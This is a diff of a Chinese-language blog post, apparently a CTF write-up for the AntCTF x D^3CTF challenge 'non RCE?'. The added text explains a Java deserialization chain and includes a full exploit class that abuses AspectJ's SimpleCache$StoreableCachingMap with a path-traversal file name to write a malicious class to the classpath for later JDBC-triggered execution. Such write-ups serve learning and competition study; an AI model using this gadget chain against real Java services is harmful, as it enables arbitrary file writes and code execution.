@@ -88,7 +88,7 @@
             <h1>AntCTF x D^3CTF non RCE?</h1>
             <span class="meta">
             	Posted on
-              2021-03-08，7 min read
+              2021-03-08，9 min read
             </span>
           </div>
         </div>
@@ -207,7 +207,9 @@ public class test {
 
         entryConstructor.setAccessible(true);
         Object entry = entryConstructor.newInstance(dataMap, file_name);
-
+   /*
+        从这开始。就是构造入口了。要了解HashSet其实是基于Hashmap的一个。而Hashmap又是基于hash表的的一个key value。所以。这里要先反射。得到HashSet的Map。其实就是一个Hashmap类。然后再基于这个map。获取里面的hash表。再把里面的key。也就是foo改为我们的object
+        */
         HashSet map = new HashSet(1);
         map.add(&quot;foo&quot;);
         Field field = null;
@@ -285,7 +287,50 @@ emmmm。先说一下。后面的利用是<code>SimpleeCache$StoreableCachingMap.
 <p>接下来。就是利用了。<br>
 利用这个写文件的Gadget配合jdbc反序列化往classpath里写入exp.class。里面是重写了readobject方法的恶意类字节码<br>
 然后呢。再配合jdbc反序列化。发送一个恶意类过去。这时候就会在classpath里找对应的class。找到了。触发重写的readobject。执行里面的恶意代码。至此完结</p>
-<p>至于。。咋根据链子写出Exp。。emm还在学。</p>
+<p>根据链子写出Exp<br>
+发现公开的EXP。后面反射赋值都是可以省略的。因为类型是泛型。<br>
+<img src="https://guokeya.github.io/post-images/1615380774832.png" alt="" loading="lazy"></p>
+<pre><code>package launch;
+
+import checker.DataMap;
+import java.io.*;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationTargetException;
+import java.nio.file.Files;
+import java.util.HashMap;
+import java.util.HashSet;
+import java.util.Map;
+
+public class myexp implements Serializable {
+    public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException, NoSuchFieldException {
+        Constructor aspectjConstructor = Class.forName(&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;).getDeclaredConstructors()[0];
+        aspectjConstructor.setAccessible(true);
+        HashMap wrapperMap = new HashMap();
+        byte[] content_byte = Files.readAllBytes(new File(&quot;C:\\Users\\Administrator\\Downloads\\fg实验室\\target\\classes\\launch\\Exp.class&quot;).toPath());
+        String file_name = &quot;../../../../../../../../../../../exp.class&quot;;
+        wrapperMap.put(file_name, content_byte);
+        //	HashMap类。文件名-&gt;文件内容
+        Object simpleCache = aspectjConstructor.newInstance(&quot;.&quot;, 12);
+        Constructor entryConstructor = Class.forName(&quot;checker.DataMap$Entry&quot;).getDeclaredConstructors()[0];
+        entryConstructor.setAccessible(true);
+        DataMap dataMap = new DataMap( wrapperMap,(Map) simpleCache);
+        //DataMap$Entry的this.values SimpleeCache$StoreableCachingMap类  this.wrapperMap DataMap$Entry类
+        Object entry =  entryConstructor.newInstance(dataMap,&quot;../../../../../../../../../../../exp.class&quot;);
+        //DataMap$Entry的this.key	文件名
+        HashSet map = new HashSet(1);
+        map.add(entry);
+        ObjectOutputStream o = new ObjectOutputStream(new FileOutputStream(&quot;aaaaa.obj&quot;));
+        o.writeObject(map);
+        o.flush();
+        o.close();
+        System.out.println(map);
+
+    }
+}
+</code></pre>
+<p>后面再整了一遍。发现对入口点还懵着<br>
+为什么我们修改map的key为恶意对象就可以触发反序列化呢<br>
+<img src="https://guokeya.github.io/post-images/1615378850965.png" alt="" loading="lazy"></p>
 
           
           <p class="next-post">下一篇：
